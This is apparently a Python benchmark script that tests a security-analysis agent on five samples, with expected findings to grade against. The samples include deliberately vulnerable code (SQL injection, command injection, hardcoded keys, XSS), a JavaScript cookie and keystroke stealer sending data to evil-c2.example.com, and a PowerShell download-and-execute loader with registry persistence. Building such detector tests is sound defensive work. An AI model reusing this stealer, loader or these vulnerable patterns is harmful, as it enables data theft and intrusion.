"""
3.1.6 批量样本测试脚本 — 评估 Agent 准确率和 Token 消耗
"""
import os
import sys
import json
import time
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ==============================================================================
# 5 个测试样本定义
# ==============================================================================

SAMPLES = [
    {
        "id": 1,
        "name": "Python SQL 注入",
        "expected_type": "vulnerability_detection",
        "expected_findings": ["SQL注入", "CWE-89"],
        "code": '''\
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route("/user/<username>")
def get_user(username):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return str(result)

if __name__ == "__main__":
    app.run(debug=True)
''',
    },
    {
        "id": 2,
        "name": "Python 命令注入 + 硬编码密钥",
        "expected_type": "vulnerability_detection",
        "expected_findings": ["命令注入", "CWE-78", "硬编码", "CWE-798"],
        "code": '''\
import os
import subprocess

API_KEY = "sk-abc123def456ghi789jkl"

def ping_host(host):
    os.system("ping -c 4 " + host)

def run_backup(filename):
    cmd = f"tar -czf /backup/{filename}.tar.gz /data/{filename}"
    subprocess.call(cmd, shell=True)

def admin_reset(user_id):
    password = "admin123!"
    os.system(f"echo 'Resetting password for {user_id} to {password}'")
''',
    },
    {
        "id": 3,
        "name": "JavaScript 信息窃取脚本",
        "expected_type": "malware_analysis",
        "expected_findings": ["C2通信", "窃取", "keylogging", "WebSocket"],
        "code": '''\
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://evil-c2.example.com/collect", true);

var data = {
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    url: window.location.href
};
xhr.send(JSON.stringify(data));

document.addEventListener("keydown", function(e) {
    var kxhr = new XMLHttpRequest();
    kxhr.open("POST", "https://evil-c2.example.com/keys", true);
    kxhr.send(JSON.stringify({key: e.key, timestamp: Date.now()}));
});

var ws = new WebSocket("wss://evil-c2.example.com/ws");
ws.onmessage = function(e) {
    eval(JSON.parse(e.data).code);
};
''',
    },
    {
        "id": 4,
        "name": "PowerShell 远程下载执行",
        "expected_type": "malware_analysis",
        "expected_findings": ["下载", "执行", "powerShell", "C2"],
        "code": '''\
$url = "https://evil-c2.example.com/payload.ps1"
$output = "$env:TEMP\\update.ps1"
(New-Object Net.WebClient).DownloadFile($url, $output)
Invoke-Expression (Get-Content $output -Raw)

$key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $key -Name "WindowsUpdate" -Value $output
''',
    },
    {
        "id": 5,
        "name": "JavaScript XSS 漏洞",
        "expected_type": "vulnerability_detection",
        "expected_findings": ["XSS", "CWE-79", "innerHTML"],
        "code": '''\
function displaySearchResults(query) {
    var resultsDiv = document.getElementById("results");
    resultsDiv.innerHTML = "<h2>Search results for: " + query + "</h2>";

    fetch("/api/search?q=" + encodeURIComponent(query))
        .then(response => response.json())
        .then(data => {
            var html = "<ul>";
            data.forEach(item => {
                html += "<li>" + item.title + "</li>";
            });
            html += "</ul>";
            document.getElementById("results-list").innerHTML = html;
        });
}

function setUserName() {
    var params = new URLSearchParams(window.location.search);
    var name = params.get("name");
    document.getElementById("welcome").innerHTML = "Welcome, " + name + "!";
}
''',
    },
]

EXPECTED_TYPES = {
    "vulnerability_detection": "漏洞检测",
    "malware_analysis": "恶意分析",
}


def run_sample(sample: dict, mock_only: bool = True) -> dict:
    """运行单个样本测试，返回结果指标。"""
    demo_script = os.path.join(os.path.dirname(__file__), "..", "app", "agent", "demo_cli2.py")

    # 写入临时代码文件
    tmp_file = os.path.join(os.path.dirname(__file__), "samples", f"_tmp_{sample['id']}.txt")
    with open(tmp_file, "w", encoding="utf-8") as f:
        f.write(sample["code"])

    cmd = [
        sys.executable, demo_script,
        "--file", tmp_file,
        "--max-steps", "8",
        "--quiet",
    ]
    if mock_only:
        cmd.append("--mock-only")

    start = time.time()
    proc = subprocess.run(
        cmd,
        capture_output=True, text=True,
        encoding="utf-8", errors="replace",
        timeout=180,
        env={**os.environ, "PYTHONIOENCODING": "utf-8"},
    )
    elapsed = round(time.time() - start, 1)

    # 清理临时文件
    try:
        os.remove(tmp_file)
    except OSError:
        pass

    stdout = proc.stdout
    stderr = proc.stderr

    # 解析结果
    result: dict = {
        "sample_id": sample["id"],
        "sample_name": sample["name"],
        "elapsed_seconds": elapsed,
        "exit_code": proc.returncode,
        "success": False,
        "detected_type": "unknown",
        "type_correct": False,
        "findings_matched": [],
        "findings_missed": [],
        "confidence_level": "unknown",
        "confidence_score": 0,
        "total_steps": 0,
        "token_total": 0,
        "token_prompt": 0,
        "token_completion": 0,
        "token_calls": 0,
        "error": None,
        "notes": "",
    }

    # 检查 stderr
    if "ERROR" in stderr:
        result["notes"] += f"stderr: {stderr[:200]}; "

    # 提取任务类型
    if "漏洞检测" in stdout:
        result["detected_type"] = "vulnerability_detection"
    elif "恶意代码分析" in stdout or "恶意分析" in stdout:
        result["detected_type"] = "malware_analysis"

    result["type_correct"] = (result["detected_type"] == sample["expected_type"])
    if not result["type_correct"]:
        result["notes"] += f"类型错误: 期望{sample['expected_type']}, 得到{result['detected_type']}; "

    # 检查是否有 ERROR
    if "ERROR:" in stdout:
        error_start = stdout.index("ERROR:")
        error_end = stdout.index("\n", error_start) if "\n" in stdout[error_start:] else len(stdout)
        result["error"] = stdout[error_start:error_end].strip()
        result["notes"] += f"分析错误: {result['error']}; "
        return result

    result["success"] = True

    # 提取置信度
    for line in stdout.split("\n"):
        if "综合置信度:" in line:
            level_part = line.split("(")[0] if "(" in line else line
            for level in ["HIGH", "MEDIUM", "LOW"]:
                if level in level_part.upper():
                    result["confidence_level"] = level.lower()
                    break
            if "(" in line and "/100)" in line:
                try:
                    score_str = line.split("(")[1].split("/100")[0]
                    result["confidence_score"] = int(score_str)
                except (ValueError, IndexError):
                    pass

    # 提取 Token 统计
    for line in stdout.split("\n"):
        if "Token:" in line and "输入" in line:
            try:
                parts = line.split("输入")[1].split("+")[0].strip()
                result["token_prompt"] = int(parts)
                parts2 = line.split("输出")[1].split("=")[0].strip()
                result["token_completion"] = int(parts2)
                parts3 = line.split("总计")[1].split("(")[0].strip()
                result["token_total"] = int(parts3)
                parts4 = line.split("(")[1].split("次")[0].strip()
                result["token_calls"] = int(parts4)
            except (ValueError, IndexError):
                pass

    # 提取步数
    for line in stdout.split("\n"):
        if "总步数:" in line:
            try:
                result["total_steps"] = int(line.split("总步数:")[1].strip().split()[0])
            except (ValueError, IndexError):
                pass

    # 检查预期发现
    full_output = stdout.lower()
    for keyword in sample["expected_findings"]:
        if keyword.lower() in full_output:
            result["findings_matched"].append(keyword)
        else:
            result["findings_missed"].append(keyword)

    if result["findings_missed"]:
        result["notes"] += f"漏检: {result['findings_missed']}; "

    return result


def print_report(results: list[dict]) -> None:
    """打印测试汇总报告。"""
    print("\n" + "=" * 80)
    print("  SecAgent 3.1.6 — 5 样本测试报告")
    print("=" * 80)

    print(f"\n{'ID':<4} {'样本名称':<24} {'期望':<8} {'检测':<8} {'类型':<6} {'置信度':<8} {'步数':<5} {'Token':<8} {'耗时':<7} {'状态'}")
    print("-" * 80)

    for r in results:
        type_ok = "OK" if r["type_correct"] else "FAIL"
        status = "PASS" if r["success"] and not r["findings_missed"] else ("PARTIAL" if r["success"] and r["findings_missed"] else "FAIL")
        expected_short = EXPECTED_TYPES.get(r.get("expected_type", ""), "")[:6]
        detected_short = EXPECTED_TYPES.get(r.get("detected_type", ""), "")[:6]
        conf = f"{r['confidence_level']}({r['confidence_score']})" if r["confidence_score"] else r["confidence_level"]
        print(f"{r['sample_id']:<4} {r['sample_name']:<24} {expected_short:<8} {detected_short:<8} {type_ok:<6} {conf:<8} {r['total_steps']:<5} {r['token_total']:<8} {r['elapsed_seconds']}s  {status}")

    print("-" * 80)

    # 汇总统计
    success_count = sum(1 for r in results if r["success"])
    type_correct_count = sum(1 for r in results if r["type_correct"])
    total_token = sum(r["token_total"] for r in results)
    total_time = sum(r["elapsed_seconds"] for r in results)
    avg_confidence = sum(r["confidence_score"] for r in results if r["confidence_score"]) / max(1, sum(1 for r in results if r["confidence_score"]))
    total_missed = sum(len(r["findings_missed"]) for r in results)
    total_matched = sum(len(r["findings_matched"]) for r in results)

    print(f"\n  汇总统计:")
    print(f"    成功率: {success_count}/{len(results)} ({success_count*100//len(results)}%)")
    print(f"    类型识别准确率: {type_correct_count}/{len(results)} ({type_correct_count*100//len(results)}%)")
    print(f"    发现命中率: {total_matched}/{total_matched + total_missed} ({total_matched*100//max(1, total_matched+total_missed)}%)")
    print(f"    平均置信度: {avg_confidence:.0f}/100")
    print(f"    总 Token 消耗: {total_token}")
    print(f"    总耗时: {total_time}s")
    print(f"    平均耗时: {total_time/len(results):.1f}s/样本")

    # 详细说明
    print(f"\n  各样本详情:")
    for r in results:
        print(f"\n  [{r['sample_id']}] {r['sample_name']}")
        print(f"    期望类型: {EXPECTED_TYPES.get(r.get('expected_type', ''), '')} → 检测: {EXPECTED_TYPES.get(r.get('detected_type', ''), '')} {'✓' if r['type_correct'] else '✗'}")
        if r["findings_matched"]:
            print(f"    命中: {', '.join(r['findings_matched'])} ✓")
        if r["findings_missed"]:
            print(f"    漏检: {', '.join(r['findings_missed'])} ✗")
        if r["error"]:
            print(f"    错误: {r['error']}")
        if r["notes"]:
            print(f"    备注: {r['notes'].strip()}")

    print(f"\n{'=' * 80}\n")


def main():
    mock_only = "--mock-only" in sys.argv or len(sys.argv) == 1
    print(f"\n模式: {'模拟工具 (mock-only)' if mock_only else '真实工具'}")
    print(f"样本数: {len(SAMPLES)}")
    print(f"开始测试...\n")

    results = []
    for sample in SAMPLES:
        print(f"  [{sample['id']}/{len(SAMPLES)}] 测试: {sample['name']}...", end=" ", flush=True)
        result = run_sample(sample, mock_only=mock_only)
        results.append(result)
        status = "PASS" if result["success"] and not result["findings_missed"] else ("PARTIAL" if result["success"] else "FAIL")
        print(f"{status} ({result['elapsed_seconds']}s, {result['token_total']} tokens)")

    print_report(results)

    # 保存 JSON 报告
    report_path = os.path.join(os.path.dirname(__file__), "test_report_3_1_6.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"详细报告已保存: {report_path}")


if __name__ == "__main__":
    main()
